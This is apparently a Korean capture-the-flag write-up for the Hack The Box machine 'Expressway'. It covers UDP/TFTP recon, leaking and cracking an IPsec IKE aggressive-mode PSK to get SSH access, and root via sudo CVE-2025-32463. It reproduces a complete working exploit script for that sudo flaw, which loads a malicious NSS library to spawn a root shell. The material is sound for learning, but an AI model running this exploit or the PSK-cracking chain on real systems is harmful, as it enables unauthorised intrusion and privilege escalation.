# HTB-EXPRESSWAY
```bash
OS: Linux
DATE: 26.11.11
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사와 상세 포트 검사, 그리고 UDP 포트 검사도 진행하였다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22 IP
```
```bash
nmap -sUV --top-ports 100 IP
```
검사 결과 TCP 포트는 SSH(22), UDP 포트는 TFTP(69), isakmp?(500) 포트가 열려 있는 것을 알 수 있었다. 먼저 TFTP는 확실히 열려 있어 nmap script를 찾아서 다시 한번 돌려보았다.
```bash
ls /usr/share/nmap/scripts | grep tftp

tftp-enum.nse
tftp-version.nse
```
```bash
nmap -sU -p 69 --script=tftp-enum.nse IP

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum:
|_  ciscortr.cfg
```
그 결과 `ciscortr.cfg`라는 파일이 TFTP에 있다는 것을 알게 되어 다운로드 받고 확인해 보았다. 확인 결과:
```bash
enable password *****
!
username ike password *****
```
그 결과 ike라는 유저가 있는 것을 알게 되었다.

## Initial Access
이제 알 수 없던 포트였던 ISAKMP 500번 포트를 조사해 보았다. 먼저 IPsec이란 VPN 중 IPsec VPN이라는 방식이다. 인터넷을 통해 암호화된 터널을 만드는 것이다. 그런데 암호화 터널을 만들려면 먼저 두 가지를 합의해야 한다. 1. 어떤 암호화/해시를 사용할 건지, 2. 서로가 진짜 맞는 상대인지 인증. 이 협상과 인증을 담당하는 프로토콜이 IKE이고, 이게 UDP(500) ISAKMP에서 돈다. 그래서 TCP 스캔에는 잡히지 않고 UDP 스캔을 해야 보이는 것이다. 그리고 인증 방식 중 제일 흔한 게 PSK인데, 양쪽이 미리 공유해 둔 공통 비밀번호다. 사람 로그인 비번이랑 비슷한 개념이다. 따라서 **ike-scan**이라는 도구를 사용하여 IKE 서버인지 확인해 보았다.
```bash
ike-scan IP

Main Mode Handshake returned HDR=(CKY-R=ddabd9a523eb1e8d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0  )
```
이로써 IKE 서버로부터 응답을 받았기 때문에 확정 지을 수 있었다. 이후 IKE의 핵심 개념인 협상에는 두 가지 모드가 있다. 먼저 **Main Mode**는 메시지를 6번 주고받는다. 그리고 신원과 인증 정보를 암호화된 후에 교환한다(도청해도 유저네임·해시가 안 보임). 그리고 **Aggressive Mode**가 있다. 메시지를 3번만 주고받는다. 그리고 속도를 위해 암호화가 확립되기 전에 신원과 PSK로 만든 해시를 평문으로 날려버린다. 대상 모드는 빠르지만 위험하다는 단점이 있다. 이 모드의 치명적인 포인트는, 인증을 거치지 않은 아무 공격자나 서버에게 첫 메시지만 던지면 서버가 친절하게 자기 신원과 PSK 기반 해시를 응답으로 뱉어준다는 것이다. 따라서 ike-scan을 활용하여 어그레시브 모드가 되는지 확인해 보았다.
```bash
ike-scan -A IP

Aggressive Mode Handshake returned HDR=(CKY-R=7661a5c1bc1df374) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```
확인 결과 유저네임이 유출되었고, psk 또한 유출이 가능하기에 해시를 크랙 가능한 형태로 캡처할 수 있는 옵션을 넣어 주었다.
```bash
ike-scan -M -A <타겟IP> --pskcrack=hash.txt -n ike@expressway.htb
```
이렇게 hash를 얻을 수 있게 되어 psk-crack이라는 크래커로 크랙을 진행하였다.
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```
그 결과 평문 키를 얻을 수 있었다. 크랙해서 얻은 것은 VPN 터널용 비번이지만, ike 유저의 ssh 비밀번호일 수도 있다고 생각하여 시도한 결과, 유저 쉘을 얻고 user 플래그도 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261111123541.png)

## Privilege Escalation
이제 쉘을 얻고 sudo -l 등 여러 가지를 시도하였지만 불가능하였다. 그중 sudo의 버전을 확인해 본 결과 **1.9.17** 버전이라는 것을 알게 되었다. 대상 버전은 `CVE-2025-32463` 취약점이 있기에 [PoC](https://github.com/0p5cur/CVE-2025-32463-POC/blob/main/CVE-2025-32463.sh)를 찾아 실행해 보았다.
```bash
#!/bin/bash
# CVE-2025-32463 – Sudo EoP Exploit PoC by opscur

set -e

STAGE=$(mktemp -d /tmp/sudopwn.XXXXXX)
cd "$STAGE"

cat > pwn.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void pwn(void) {
    setreuid(0, 0);
    setregid(0, 0);
    
    chdir("/root");
    
    char *env[] = { 
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 
        "TERM=$TERM", 
        "HOME=/root", 
        "USER=root", 
        "LOGNAME=root", 
        NULL 
    };
    
    if (access("/bin/bash", X_OK) == 0) {
        execle("/bin/bash", "bash", "-i", NULL, env);
    } else {
        execle("/bin/sh", "sh", "-i", NULL, env);
    }
    _exit(0);
}
EOF

mkdir -p root/etc libnss_
echo "passwd: /pwn" > root/etc/nsswitch.conf
cp /etc/group root/etc

gcc -shared -fPIC -Wl,-init,pwn -o libnss_/pwn.so.2 pwn.c

sudo -R root pwn

cd /tmp
rm -rf "$STAGE"
```
```bash
chmod +x exploit.sh
```
```bash
./exploit.sh
```
그 결과 root 쉘을 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261111130420.png)

## New Inform
- nmap에서 알 수 없는 포트가 나왔을 때 `ls /usr/share/nmap/scripts` 위치에서 grep으로 대상 서비스 스크립트를 찾아서 돌려보자
- VPN 중 IPsec이라는 방식이 있는데, 담당 프로토콜이 IKE이고 이게 500번 포트 ISAKMP에서 돈다
- IKE 서비스가 있을 때 먼저 ike-scan으로 돌려주고, 확인되면 -A 옵션으로 어그레시브 모드에서 유저명이나 해시가 유출되는지 확인하자
- psk 해시는 `psk-crack`으로 크래킹 가능하다
- 버전을 항상 확인하자. 안 되더라도 한번 더 시도